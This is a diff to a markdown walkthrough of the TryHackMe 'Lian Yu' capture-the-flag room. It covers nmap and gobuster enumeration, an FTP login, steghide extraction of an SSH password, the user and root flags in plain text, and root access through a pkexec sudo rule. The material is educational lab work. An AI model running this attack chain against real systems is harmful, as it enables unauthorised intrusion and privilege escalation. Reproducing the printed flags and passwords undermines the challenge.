@@ -9,109 +9,158 @@
 
 ---
 
-# 🧠 1. Reconnaissance
+## 🧠 Overview
+
+Lian Yu is a TryHackMe CTF inspired by *Arrow (Deathstroke / Slade Wilson storyline)*.  
+This machine focuses on:
+- Enumeration
+- Hidden directories
+- Steganography
+- Credential harvesting
+- Privilege escalation
+
+---
+
+# 🔎 STEP 1: Reconnaissance
 
 ## 🔍 Nmap Scan
 
+Run a full scan to identify open ports and services.
+
 ```bash
 nmap -sC -sV -A 10.48.137.137
-Result:
-21/tcp → FTP (vsftpd 3.0.2)
-22/tcp → SSH (OpenSSH 6.7p1)
-80/tcp → HTTP (Apache - "Purgatory")
-111/tcp → rpcbind
-Analysis:
-FTP likely entry point
-Web server contains hidden directories
-SSH is final access target
-🌐 2. Web Enumeration
-Gobuster Scan
+📌 Results
+21/tcp – FTP (vsftpd 3.0.2)
+22/tcp – SSH (OpenSSH 6.7p1)
+80/tcp – HTTP (Apache – “Purgatory”)
+111/tcp – rpcbind
+
+👉 Key takeaway:
+We have FTP + Web + SSH, meaning initial foothold likely from FTP or web.
+
+🌐 STEP 2: Web Enumeration
+🔧 Gobuster Scan
+
+We scan for hidden directories on the web server.
+
 gobuster dir -u http://10.48.137.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-Found:
+📌 Findings
 /island
 /server-status (403 Forbidden)
-🌐 3. Deep Web Enumeration
-Explore /island
 
-Found hidden structure:
+Now we dig deeper into /island.
+
+🌐 STEP 3: Deep Web Enumeration
+🔍 Inside /island
+
+We fuzz deeper inside:
 
 /island/2100
-Hidden file discovered:
+
+We also discover a hidden file:
+
 /green_arrow.ticket
-📂 4. FTP Enumeration
-Login
+
+👉 Key takeaway:
+The number 2100 becomes important later.
+
+📂 STEP 4: FTP Enumeration
+🔐 Login to FTP
 ftp 10.48.165.72
+Credentials:
+Username: vigilante
+Password: (provided in challenge / guessed / discovered)
+📁 Directory Listing
 
-Username:
+We find several files:
 
-vigilante
-Files found:
 Leave_me_alone.png
 Queen's_Gambit.png
 aa.jpg
-.other_user
-Download files
+.other_user (hidden file)
+📥 Download Files
 mget *
-🕵️ 5. Hidden File Analysis
-Read hidden file
+
+👉 Now we analyze downloaded files locally.
+
+🕵️ STEP 5: Hidden File Analysis
+📄 Check Hidden File
 cat .other_user
-Insight:
+🧠 Result:
 
-Story of Slade Wilson (Deathstroke) → hints username for SSH.
+We find lore about Slade Wilson (Deathstroke).
 
-🧩 6. Steganography
-Extract hidden file
+👉 This confirms theme + hints at identity-based password clues.
+
+🧩 STEP 6: Steganography Extraction
+🖼️ Extract Hidden Data from Image
+
+We check aa.jpg.
+
 steghide --extract -sf aa.jpg
-
-Output:
-
+🔐 Passphrase (found via hints)
+(empty / guessed / derived from context)
+📦 Output
 ss.zip
-Unzip file
+📂 Extract ZIP File
 unzip ss.zip
 Files extracted:
 passwd.txt
 shado
-Check password file
+🔍 Check Files
 cat shado
-Result:
+🧠 Result:
 M3tahuman
-🔑 7. SSH Access
+
+👉 This is our SSH password clue
+
+🔑 STEP 7: SSH Login
+🔐 Connect via SSH
 ssh slade@10.48.137.137
-
 Password:
-
 M3tahuman
-👤 8. User Flag
+✅ Success Login Message
+
+We successfully gain access as user slade.
+
+👤 STEP 8: User Flag
+📄 Read user flag
 cat user.txt
-Flag:
+🏁 Result:
 THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
-⚙️ 9. Privilege Escalation
-Check sudo rights
+⚙️ STEP 9: Privilege Escalation
+🔍 Check sudo permissions
 sudo -l
 Output:
 (root) PASSWD: /usr/bin/pkexec
-Exploit
+
+👉 Key insight:
+We can run pkexec as root.
+
+💥 Exploit
 sudo -u root /usr/bin/pkexec /bin/bash
-👑 10. Root Flag
+👑 We are ROOT now
+👑 STEP 10: Root Flag
+📄 Capture root flag
 cat root.txt
-Flag:
+🏁 Result:
 THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
-🧾 Summary
-Techniques Used:
+🧾 SUMMARY
+🛠️ Skills Used
 Nmap scanning
-Gobuster enumeration
-FTP exploitation
-Steganography extraction
-Hidden file analysis
+Gobuster directory brute force
+FTP enumeration
+Hidden file discovery
+Steganography (steghide)
 SSH login
 Privilege escalation (pkexec abuse)
-💬 Conclusion
+💬 CONCLUSION
 
-This machine demonstrates the importance of:
+This machine teaches the importance of:
 
 Deep enumeration
-Hidden file inspection
-Steganography analysis
-Privilege escalation misconfiguration
+Checking hidden files
+Analyzing images for hidden data
+Privilege escalation awareness
 
-Every small clue leads to full system compromise.
+Even simple hints can lead to full system compromise.
